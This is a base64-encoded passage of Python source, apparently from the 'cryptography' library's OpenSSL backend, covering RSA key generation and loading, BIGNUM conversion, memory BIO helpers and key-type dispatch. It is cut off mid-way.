cm9yc193aXRoX3RleHQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gdHlwaW5nLkxpc3RbYmluZGluZy5fT3BlblNTTEVycm9yV2l0aFRleHRdOlxyXG4gICAgICAgIHJldHVybiBiaW5kaW5nLl9jb25zdW1lX2Vycm9yc193aXRoX3RleHQoc2VsZi5fbGliKVxyXG5cclxuICAgIGRlZiBfYm5fdG9faW50KHNlbGYsIGJuKSAtPiBpbnQ6XHJcbiAgICAgICAgYXNzZXJ0IGJuICE9IHNlbGYuX2ZmaS5OVUxMXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChub3Qgc2VsZi5fbGliLkJOX2lzX25lZ2F0aXZlKGJuKSlcclxuXHJcbiAgICAgICAgYm5fbnVtX2J5dGVzID0gc2VsZi5fbGliLkJOX251bV9ieXRlcyhibilcclxuICAgICAgICBiaW5fcHRyID0gc2VsZi5fZmZpLm5ldygidW5zaWduZWQgY2hhcltdIiwgYm5fbnVtX2J5dGVzKVxyXG4gICAgICAgIGJpbl9sZW4gPSBzZWxmLl9saWIuQk5fYm4yYmluKGJuLCBiaW5fcHRyKVxyXG4gICAgICAgICMgQSB6ZXJvIGxlbmd0aCBtZWFucyB0aGUgQk4gaGFzIHZhbHVlIDBcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGJpbl9sZW4gPj0gMClcclxuICAgICAgICB2YWwgPSBpbnQuZnJvbV9ieXRlcyhzZWxmLl9mZmkuYnVmZmVyKGJpbl9wdHIpWzpiaW5fbGVuXSwgImJpZyIpXHJcbiAgICAgICAgcmV0dXJuIHZhbFxyXG5cclxuICAgIGRlZiBfaW50X3RvX2JuKHNlbGYsIG51bTogaW50LCBibj1Ob25lKTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBDb252ZXJ0cyBhIHB5dGhvbiBpbnRlZ2VyIHRvIGEgQklHTlVNLiBUaGUgcmV0dXJuZWQgQklHTlVNIHdpbGwgbm90XHJcbiAgICAgICAgYmUgZ2FyYmFnZSBjb2xsZWN0ZWQgKHRvIHN1cHBvcnQgYWRkaW5nIHRoZW0gdG8gc3RydWN0cyB0aGF0IHRha2VcclxuICAgICAgICBvd25lcnNoaXAgb2YgdGhlIG9iamVjdCkuIEJlIHN1cmUgdG8gcmVnaXN0ZXIgaXQgZm9yIEdDIGlmIGl0IHdpbGxcclxuICAgICAgICBiZSBkaXNjYXJkZWQgYWZ0ZXIgdXNlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGFzc2VydCBibiBpcyBOb25lIG9yIGJuICE9IHNlbGYuX2ZmaS5OVUxMXHJcblxyXG4gICAgICAgIGlmIGJuIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGJuID0gc2VsZi5fZmZpLk5VTExcclxuXHJcbiAgICAgICAgYmluYXJ5ID0gbnVtLnRvX2J5dGVzKGludChudW0uYml0X2xlbmd0aCgpIC8gOC4wICsgMSksICJiaWciKVxyXG4gICAgICAgIGJuX3B0ciA9IHNlbGYuX2xpYi5CTl9iaW4yYm4oYmluYXJ5LCBsZW4oYmluYXJ5KSwgYm4pXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChibl9wdHIgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIGJuX3B0clxyXG5cclxuICAgIGRlZiBnZW5lcmF0ZV9yc2FfcHJpdmF0ZV9rZXkoXHJcbiAgICAgICAgc2VsZiwgcHVibGljX2V4cG9uZW50OiBpbnQsIGtleV9zaXplOiBpbnRcclxuICAgICkgLT4gcnNhLlJTQVByaXZhdGVLZXk6XHJcbiAgICAgICAgcnNhLl92ZXJpZnlfcnNhX3BhcmFtZXRlcnMocHVibGljX2V4cG9uZW50LCBrZXlfc2l6ZSlcclxuXHJcbiAgICAgICAgcnNhX2NkYXRhID0gc2VsZi5fbGliLlJTQV9uZXcoKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocnNhX2NkYXRhICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHJzYV9jZGF0YSA9IHNlbGYuX2ZmaS5nYyhyc2FfY2RhdGEsIHNlbGYuX2xpYi5SU0FfZnJlZSlcclxuXHJcbiAgICAgICAgYm4gPSBzZWxmLl9pbnRfdG9fYm4ocHVibGljX2V4cG9uZW50KVxyXG4gICAgICAgIGJuID0gc2VsZi5fZmZpLmdjKGJuLCBzZWxmLl9saWIuQk5fZnJlZSlcclxuXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLlJTQV9nZW5lcmF0ZV9rZXlfZXgoXHJcbiAgICAgICAgICAgIHJzYV9jZGF0YSwga2V5X3NpemUsIGJuLCBzZWxmLl9mZmkuTlVMTFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fcnNhX2NkYXRhX3RvX2V2cF9wa2V5KHJzYV9jZGF0YSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9SU0FQcml2YXRlS2V5KFxyXG4gICAgICAgICAgICBzZWxmLCByc2FfY2RhdGEsIGV2cF9wa2V5LCBzZWxmLl9yc2Ffc2tpcF9jaGVja19rZXlcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGdlbmVyYXRlX3JzYV9wYXJhbWV0ZXJzX3N1cHBvcnRlZChcclxuICAgICAgICBzZWxmLCBwdWJsaWNfZXhwb25lbnQ6IGludCwga2V5X3NpemU6IGludFxyXG4gICAgKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHB1YmxpY19leHBvbmVudCA+PSAzXHJcbiAgICAgICAgICAgIGFuZCBwdWJsaWNfZXhwb25lbnQgJiAxICE9IDBcclxuICAgICAgICAgICAgYW5kIGtleV9zaXplID49IDUxMlxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgbG9hZF9yc2FfcHJpdmF0ZV9udW1iZXJzKFxyXG4gICAgICAgIHNlbGYsIG51bWJlcnM6IHJzYS5SU0FQcml2YXRlTnVtYmVyc1xyXG4gICAgKSAtPiByc2EuUlNBUHJpdmF0ZUtleTpcclxuICAgICAgICByc2EuX2NoZWNrX3ByaXZhdGVfa2V5X2NvbXBvbmVudHMoXHJcbiAgICAgICAgICAgIG51bWJlcnMucCxcclxuICAgICAgICAgICAgbnVtYmVycy5xLFxyXG4gICAgICAgICAgICBudW1iZXJzLmQsXHJcbiAgICAgICAgICAgIG51bWJlcnMuZG1wMSxcclxuICAgICAgICAgICAgbnVtYmVycy5kbXExLFxyXG4gICAgICAgICAgICBudW1iZXJzLmlxbXAsXHJcbiAgICAgICAgICAgIG51bWJlcnMucHVibGljX251bWJlcnMuZSxcclxuICAgICAgICAgICAgbnVtYmVycy5wdWJsaWNfbnVtYmVycy5uLFxyXG4gICAgICAgIClcclxuICAgICAgICByc2FfY2RhdGEgPSBzZWxmLl9saWIuUlNBX25ldygpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyc2FfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgcnNhX2NkYXRhID0gc2VsZi5fZmZpLmdjKHJzYV9jZGF0YSwgc2VsZi5fbGliLlJTQV9mcmVlKVxyXG4gICAgICAgIHAgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5wKVxyXG4gICAgICAgIHEgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5xKVxyXG4gICAgICAgIGQgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5kKVxyXG4gICAgICAgIGRtcDEgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5kbXAxKVxyXG4gICAgICAgIGRtcTEgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5kbXExKVxyXG4gICAgICAgIGlxbXAgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5pcW1wKVxyXG4gICAgICAgIGUgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5wdWJsaWNfbnVtYmVycy5lKVxyXG4gICAgICAgIG4gPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5wdWJsaWNfbnVtYmVycy5uKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5SU0Ffc2V0MF9mYWN0b3JzKHJzYV9jZGF0YSwgcCwgcSlcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5SU0Ffc2V0MF9rZXkocnNhX2NkYXRhLCBuLCBlLCBkKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLlJTQV9zZXQwX2NydF9wYXJhbXMocnNhX2NkYXRhLCBkbXAxLCBkbXExLCBpcW1wKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9yc2FfY2RhdGFfdG9fZXZwX3BrZXkocnNhX2NkYXRhKVxyXG5cclxuICAgICAgICByZXR1cm4gX1JTQVByaXZhdGVLZXkoXHJcbiAgICAgICAgICAgIHNlbGYsIHJzYV9jZGF0YSwgZXZwX3BrZXksIHNlbGYuX3JzYV9za2lwX2NoZWNrX2tleVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgbG9hZF9yc2FfcHVibGljX251bWJlcnMoXHJcbiAgICAgICAgc2VsZiwgbnVtYmVyczogcnNhLlJTQVB1YmxpY051bWJlcnNcclxuICAgICkgLT4gcnNhLlJTQVB1YmxpY0tleTpcclxuICAgICAgICByc2EuX2NoZWNrX3B1YmxpY19rZXlfY29tcG9uZW50cyhudW1iZXJzLmUsIG51bWJlcnMubilcclxuICAgICAgICByc2FfY2RhdGEgPSBzZWxmLl9saWIuUlNBX25ldygpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyc2FfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgcnNhX2NkYXRhID0gc2VsZi5fZmZpLmdjKHJzYV9jZGF0YSwgc2VsZi5fbGliLlJTQV9mcmVlKVxyXG4gICAgICAgIGUgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5lKVxyXG4gICAgICAgIG4gPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5uKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5SU0Ffc2V0MF9rZXkocnNhX2NkYXRhLCBuLCBlLCBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fcnNhX2NkYXRhX3RvX2V2cF9wa2V5KHJzYV9jZGF0YSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9SU0FQdWJsaWNLZXkoc2VsZiwgcnNhX2NkYXRhLCBldnBfcGtleSlcclxuXHJcbiAgICBkZWYgX2NyZWF0ZV9ldnBfcGtleV9nYyhzZWxmKTpcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2xpYi5FVlBfUEtFWV9uZXcoKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZXZwX3BrZXkgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9mZmkuZ2MoZXZwX3BrZXksIHNlbGYuX2xpYi5FVlBfUEtFWV9mcmVlKVxyXG4gICAgICAgIHJldHVybiBldnBfcGtleVxyXG5cclxuICAgIGRlZiBfcnNhX2NkYXRhX3RvX2V2cF9wa2V5KHNlbGYsIHJzYV9jZGF0YSk6XHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9jcmVhdGVfZXZwX3BrZXlfZ2MoKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FVlBfUEtFWV9zZXQxX1JTQShldnBfcGtleSwgcnNhX2NkYXRhKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmV0dXJuIGV2cF9wa2V5XHJcblxyXG4gICAgZGVmIF9ieXRlc190b19iaW8oc2VsZiwgZGF0YTogYnl0ZXMpOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybiBhIF9NZW1vcnlCSU8gbmFtZWR0dXBsZSBvZiAoQklPLCBjaGFyKikuXHJcblxyXG4gICAgICAgIFRoZSBjaGFyKiBpcyB0aGUgc3RvcmFnZSBmb3IgdGhlIEJJTyBhbmQgaXQgbXVzdCBzdGF5IGFsaXZlIHVudGlsIHRoZVxyXG4gICAgICAgIEJJTyBpcyBmaW5pc2hlZCB3aXRoLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGRhdGFfcHRyID0gc2VsZi5fZmZpLmZyb21fYnVmZmVyKGRhdGEpXHJcbiAgICAgICAgYmlvID0gc2VsZi5fbGliLkJJT19uZXdfbWVtX2J1ZihkYXRhX3B0ciwgbGVuKGRhdGEpKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoYmlvICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG5cclxuICAgICAgICByZXR1cm4gX01lbW9yeUJJTyhzZWxmLl9mZmkuZ2MoYmlvLCBzZWxmLl9saWIuQklPX2ZyZWUpLCBkYXRhX3B0cilcclxuXHJcbiAgICBkZWYgX2NyZWF0ZV9tZW1fYmlvX2djKHNlbGYpOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIENyZWF0ZXMgYW4gZW1wdHkgbWVtb3J5IEJJTy5cclxuICAgICAgICAiIiJcclxuICAgICAgICBiaW9fbWV0aG9kID0gc2VsZi5fbGliLkJJT19zX21lbSgpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChiaW9fbWV0aG9kICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGJpbyA9IHNlbGYuX2xpYi5CSU9fbmV3KGJpb19tZXRob2QpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChiaW8gIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgYmlvID0gc2VsZi5fZmZpLmdjKGJpbywgc2VsZi5fbGliLkJJT19mcmVlKVxyXG4gICAgICAgIHJldHVybiBiaW9cclxuXHJcbiAgICBkZWYgX3JlYWRfbWVtX2JpbyhzZWxmLCBiaW8pIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJlYWRzIGEgbWVtb3J5IEJJTy4gVGhpcyBvbmx5IHdvcmtzIG9uIG1lbW9yeSBCSU9zLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2ZmaS5uZXcoImNoYXIgKioiKVxyXG4gICAgICAgIGJ1Zl9sZW4gPSBzZWxmLl9saWIuQklPX2dldF9tZW1fZGF0YShiaW8sIGJ1ZilcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGJ1Zl9sZW4gPiAwKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoYnVmWzBdICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGJpb19kYXRhID0gc2VsZi5fZmZpLmJ1ZmZlcihidWZbMF0sIGJ1Zl9sZW4pWzpdXHJcbiAgICAgICAgcmV0dXJuIGJpb19kYXRhXHJcblxyXG4gICAgZGVmIF9ldnBfcGtleV90b19wcml2YXRlX2tleShzZWxmLCBldnBfcGtleSkgLT4gUFJJVkFURV9LRVlfVFlQRVM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJuIHRoZSBhcHByb3ByaWF0ZSB0eXBlIG9mIFByaXZhdGVLZXkgZ2l2ZW4gYW4gZXZwX3BrZXkgY2RhdGFcclxuICAgICAgICBwb2ludGVyLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgICAgICBrZXlfdHlwZSA9IHNlbGYuX2xpYi5FVlBfUEtFWV9pZChldnBfcGtleSlcclxuXHJcbiAgICAgICAgaWYga2V5X3R5cGUgPT0gc2VsZi5fbGliLkVWUF9QS0VZX1JTQTpcclxuICAgICAgICAgICAgcnNhX2NkYXRhID0gc2VsZi5fbGliLkVWUF9QS0VZX2dldDFfUlNBKGV2cF9wa2V5KVxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJzYV9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgcnNhX2NkYXRhID0gc2VsZi5fZmZpLmdjKHJzYV9jZGF0YSwgc2VsZi5fbGliLlJTQV9mcmVlKVxyXG4gICAgICAgICAgICByZXR1cm4gX1JTQVByaXZhdGVLZXkoXHJcbiAgICAgICAgICAgICAgICBzZWxmLCByc2FfY2RhdGEsIGV2cF9wa2V5LCBzZWxmLl9yc2Ffc2tpcF9jaGVja19rZXlcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsaWYgKFxyXG4gICAgICAgICAgICBrZXlfdHlwZSA9PSBzZWxmLl9saWIuRVZQX1BLRVlfUlNBX1BTU1xyXG4gICAgICAgICAgICBhbmQgbm90IHNlbGYuX2xpYi5DUllQVE9HUkFQSFlfSVNfTElCUkVTU0xcclxuICAgICAgICAgICAgYW5kIG5vdCBzZWxmLl9saWIuQ1JZUFRPR1JBUEhZX0lTX0JPUklOR1NTTFxyXG4gICAgICAgICAgICBhbmQgbm90IHNlbGYuX2xpYi5DUllQVE9HUkFQSFlfT1BFTlNTTF9MRVNTX1RIQU5fMTExRVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgICMgQXQgdGhlIG1vbWVudCB0aGUgd2F5IHdlIGhhbmRsZSBSU0EgUFNTIGtleXMgaXMgdG8gc3RyaXAgdGhlXHJcbiAgICAgICAgICAgICMgUFNTIGNvbnN0cmFpbnRzIGZyb20gdGhlbSBhbmQgdHJlYXQgdGhlbSBhcyBub3JtYWwgUlNBIGtleXNcclxuICAgICAgICAgICAgIyBVbmZvcnR1bmF0ZWx5IHRoZSBSU0EgKiBpdHNlbGYgdHJhY2tzIHRoaXMgZGF0YSBzbyB3ZSBuZWVkIHRvXHJcbiAgICAgICAgICAgICMgZXh0cmFjdCwgc2VyaWFsaXplLCBhbmQgcmVsb2FkIGl0IHdpdGhvdXQgdGhlIGNvbnN0cmFpbnRzLlxyXG4gICAgICAgICAgICByc2FfY2RhdGEgPSBzZWxmLl9saWIuRVZQX1BLRVlfZ2V0MV9SU0EoZXZwX3BrZXkpXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocnNhX2NkYXRhICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgICAgICByc2FfY2RhdGEgPSBzZWxmLl9mZmkuZ2MocnNhX2NkYXRhLCBzZWxmLl9saWIuUlNBX2ZyZWUpXHJcbiAgICAgICAgICAgIGJpbyA9IHNlbGYuX2NyZWF0ZV9tZW1fYmlvX2djKClcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLmkyZF9SU0FQcml2YXRlS2V5X2JpbyhiaW8sIHJzYV9jZGF0YSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYubG9hZF9kZXJfcHJpdmF0ZV9rZXkoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9yZWFkX21lbV9iaW8oYmlvKSwgcGFzc3dvcmQ9Tm9uZVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxpZiBrZXlfdHlwZSA9PSBzZWxmLl9saWIuRVZQX1BLRVlfRFNBOlxyXG4gICAgICAgICAgICBkc2FfY2RhdGEgPSBzZWxmLl9saWIuRVZQX1BLRVlfZ2V0MV9EU0EoZXZwX3BrZXkpXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZHNhX2NkYXRhICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgICAgICBkc2FfY2RhdGEgPSBzZWxmLl9mZmkuZ2MoZHNhX2NkYXRhLCBzZWxmLl9saWIuRFNBX2ZyZWUpXHJcbiAgICAgICAgICAgIHJldHVybiBfRFNBUHJpdmF0ZUtleShzZWxmLCBkc2FfY2RhdGEsIGV2cF9wa2V5KVxyXG4gICAgICAgIGVsaWYga2V5X3R5cGUgPT0gc2VsZi5fbGliLkVWUF9QS0VZX0VDOlxyXG4gICAgICAgICAgICBlY19jZGF0YSA9IHNlbGYuX2xpYi5FVlBfUEtFWV9nZXQxX0VDX0tFWShldnBfcGtleSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChlY19jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgZWNfY2RhdGEgPSBzZWxmLl9mZmkuZ2MoZWNfY2RhdGEsIHNlbGYuX2xpYi5FQ19LRVlfZnJlZSlcclxuICAgICAgICAgICAgcmV0dXJuIF9FbGxpcHRpY0N1cnZlUHJpdmF0ZUtleShzZWxmLCBlY19jZGF0YSwgZXZwX3BrZXkpXHJcbiAgICAgICAgZWxpZiBrZXlfdHlwZSBpbiBzZWxmLl9kaF90eXBlczpcclxuICAgICAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9saWIuRVZQX1BLRVlfZ2V0MV9ESChldnBfcGtleSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChkaF9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9mZmkuZ2MoZGhfY2RhdGEsIHNlbGYuX2xpYi5ESF9mcmVlKVxyXG4gICAgICAgICAgICByZXR1cm4gX0RIUHJpdmF0ZUtleShzZWxmLCBkaF9jZGF0YSwgZXZwX3BrZXkpXHJcbiAgICAgICAgZWxpZiBrZXlfdHlwZSA9PSBnZXRhdHRyKHNlbGYuX2xpYiwgIkVWUF9QS0VZX0VEMjU1MTkiLCBOb25lKTpcclxuICAgICAgICAgICAgIyBFVlBfUEtFWV9FRDI1NTE5IGlzIG5vdCBwcmVzZW50IGluIE9wZW5TU0wgPCAxLjEuMVxyXG4gICAgICAgICAgICByZXR1cm4gX0VkMjU1MTlQcml2YXRlS2V5KHNlbGYsIGV2cF9wa2V5KVxyXG4gICAgICAgIGVsaWYga2V5X3R5cGUgPT0gZ2V0YXR0cihzZWxmLl9saWIsICJFVlBfUEtFWV9YNDQ4IiwgTm9uZSk6XHJcbiAgICAgICAgICAgICMgRVZQX1BLRVlfWDQ0OCBpcyBub3QgcHJlc2VudCBpbiBPcGVuU1NMIDwgMS4xLjFcclxuICAgICAgICAgICAgcmV0dXJuIF9YNDQ4UHJpdmF0ZUtleShzZWxmLCBldnBfcGtleSlcclxuICAgICAgICBlbGlmIGtleV90eXBlID09IGdldGF0dHIoc2VsZi5fbGliLCAiRVZQX1BLRVlfWDI1NTE5IiwgTm9uZSk6XHJcbiAgICAgICAgICAgICMgRVZQX1BLRVlfWDI1NTE5IGlzIG5vdCBwcmVzZW50IGluIE9wZW5TU0wgPCAxLjEuMFxyXG4gICAgICAgICAgICByZXR1cm4gX1gyNTUxOVByaXZhdGVLZXkoc2VsZiwgZXZwX3BrZXkpXHJcbiAgICAgICAgZWxpZiBrZXlfdHlwZSA9PSBnZXRhdHRyKHNlbGYuX2xpYiwgIkVWUF9QS0VZX0VENDQ4IiwgTm9uZSk6XHJcbiAgICAgICAgICAgICMgRVZQX1BLRVlfRUQ0NDggaXMgbm90IHByZXNlbnQgaW4gT3BlblNTTCA8IDEuMS4xXHJcbiAgICAgICAgICAgIHJldHVybiBfRWQ0NDhQcml2YXRlS2V5KHNlbGYsIGV2cF9wa2V5KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKCJVbnN1cHBvcnRlZCBrZXkgdHlwZS4iKVxyXG5cclxuICAgIGRlZiBfZXZwX3BrZXlfdG9fcHVibGljX2tleShzZWxmLCBldnBfcGtleSkgLT4gUFVCTElDX0tFWV9UWVBFUzpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm4gdGhlIGFwcHJvcHJpYXRlIHR5cGUgb2YgUHVibGljS2V5IGdpdmVuIGFuIGV2cF9wa2V5IGNkYXRhXHJcbiAgICAgICAgcG9pbnRlci5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICAgICAga2V5X3R5cGUgPSBzZWxmLl9saWIuRVZQX1BLRVlfaWQoZXZwX3BrZXkpXHJcblxyXG4gICAgICAgIGlmIGtleV90eXBlID09IHNlbGYuX2xpYi5FVlBfUEtFWV9SU0E6XHJcbiAgICAgICAgICAgIHJzYV9jZGF0YSA9IHNlbGYuX2xpYi5FVlBfUEtFWV9nZXQxX1JTQShldnBfcGtleSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyc2FfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgICAgIHJzYV9jZGF0YSA9IHNlbGYuX2ZmaS5nYyhyc2FfY2RhdGEsIHNlbGYuX2xpYi5SU0FfZnJlZSlcclxuICAgICAgICAgICAgcmV0dXJuIF9SU0FQdWJsaWNLZXkoc2VsZiwgcnNhX2NkYXRhLCBldnBfcGtleSlcclxuICAgICAgICBlbGlmIGtleV90eXBlID09IHNlbGYuX2xpYi5FVlBfUEtFWV9EU0E6XHJcbiAgICAgICAgICAgIGRzYV9jZGF0YSA9IHNlbGYuX2xpYi5FVlBfUEtFWV9nZXQxX0RTQShldnBfcGtleSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChkc2FfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgICAgIGRzYV9jZGF0YSA9IHNlbGYuX2ZmaS5nYyhkc2FfY2RhdGEsIHNlbGYuX2xpYi5EU0FfZnJlZSlcclxuICAgICAgICAgICAgcmV0dXJuIF9EU0FQdWJsaWNLZXkoc2VsZiwgZHNhX2NkYXRhLCBldnBfcGtleSlcclxuICAgICAgICBlbGlmIGtleV90eXBlID09IHNlbGYuX2xpYi5FVlBfUEtFWV9FQzpcclxuICAgICAgICAgICAgZWNfY2RhdGEgPSBzZWxmLl9saWIuRVZQX1BLRVlfZ2V0MV9FQ19LRVkoZXZwX3BrZXkpXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZWNfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgICAgIGVjX2NkYXRhID0gc2VsZi5fZmZpLmdjKGVjX2NkYXRhLCBzZWxmLl9saWIuRUNfS0VZX2ZyZWUpXHJcbiAgICAgICAgICAgIHJldHVybiBfRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleShzZWxmLCBlY19jZGF0YSwgZXZwX3BrZXkpXHJcbiAgICAgICAgZWxpZiBrZXlfdHlwZSBpbiBzZWxmLl9kaF90eXBlczpcclxuICAgICAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9saWIuRVZQX1BLRVlfZ2V0MV9ESChldnBfcGtleSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChkaF9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9mZmkuZ2MoZGhfY2RhdGEsIHNlbGYuX2xpYi5ESF9mcmVlKVxyXG4gICAgICAgICAgICByZXR1cm4gX0RIUHVibGljS2V5KHNlbGYsIGRoX2NkYXRhLCBldnBfcGtleSlcclxuICAgICAgICBlbGlmIGtleV90eXBlID09IGdldGF0dHIoc2VsZi5fbGliLCAiRVZQX1BLRVlfRUQyNTUxOSIsIE5vbmUpOlxyXG4gICAgICAgICAgICAjIEVWUF9QS0VZX0VEMjU1MTkgaXMgbm90IHByZXNlbnQgaW4gT3BlblNTTCA8IDEuMS4xXHJcbiAgICAgICAgICAgIHJldHVybiBfRWQyNTUxOVB1YmxpY0tleShzZWxmLCBldnBfcGtleSlcclxuICAgICAgICBlbGlmIGtleV90eXBlID09IGdldGF0dHIoc2VsZi5fbGliLCAiRVZQX1BLRVlfWDQ0OCIsIE5vbmUpOlxyXG4gICAgICAgICAgICAjIEVWUF9QS0VZX1g0NDggaXMgbm90IHByZXNlbnQgaW4gT3BlblNTTCA8IDEuMS4xXHJcbiAgICAgICAgICAgIHJldHVybiBfWDQ0OFB1YmxpY0tleShzZWxmLCBldnBfcGtleSlcclxuICAgICAgICBlbGlmIGtleV90eXBlID09IGdldGF0dHIoc2VsZi5fbGliLCAiRVZQX1BLRVlfWDI1NTE5IiwgTm9uZSk6XHJcbiAgICAgICAgICAgICMgRVZQX1BLRVlfWDI1NTE5IGlzIG5vdCBwcmVzZW50IGluIE9wZW5TU0wgPCAxLjEuMFxyXG4gICAgICAgICAgICByZXR1cm4gX1gyNTUxOVB1YmxpY0tleShzZWxmLCBldnBfcGtleSlcclxuICAgICAgICBlbGlmIGtleV90eXBlID09IGdldGF0dHIoc2VsZi5fbGliLCAiRVZQX1BLRVlfRUQ0NDgiLCBOb25lKTpcclxuICAgICAgICAgICAgIyBFVlBf